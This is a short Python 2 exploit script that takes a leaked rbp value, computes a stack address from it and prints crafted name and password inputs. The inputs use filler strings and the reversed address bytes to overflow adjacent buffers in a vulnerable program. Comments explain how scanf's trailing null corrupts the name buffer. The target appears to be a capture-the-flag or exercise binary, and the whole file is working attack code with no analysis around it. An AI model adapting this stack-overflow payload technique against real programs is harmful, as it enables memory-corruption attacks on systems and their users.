#!/usr/bin/python

def hexify(n):
  a = '%x' % n
  bytes = [ a[i:i+2] for i in range(0,len(a),2) ]
  return map(lambda bs: int(bs,16), bytes)

def own(n):
  return 'owns:%02i\0' % n
  #return 'ownz_u!\0'

def owns(a,b):
  return ''.join(map(own,range(a,b)))

def main(rbp):
  # Number of 'ownz_u!\0' strings to shift from center of name-pw
  # buffers.
  delta = 0
  bytes = hexify(rbp - 144 + delta*8)

  # name
  print (owns(16,32) + ''.join(map(chr,reversed(bytes))))
  # pw
  #
  # We drop the last null (with [:-1]) because scanf() writes a
  # trailing null for us.  At one point the scanf() null was
  # overflowing into the first byte of name, making name an empty
  # string :P
  print owns(0,16)[:-1]

if __name__ == '__main__':
  rbp = int(raw_input(), 16)
  main(rbp)
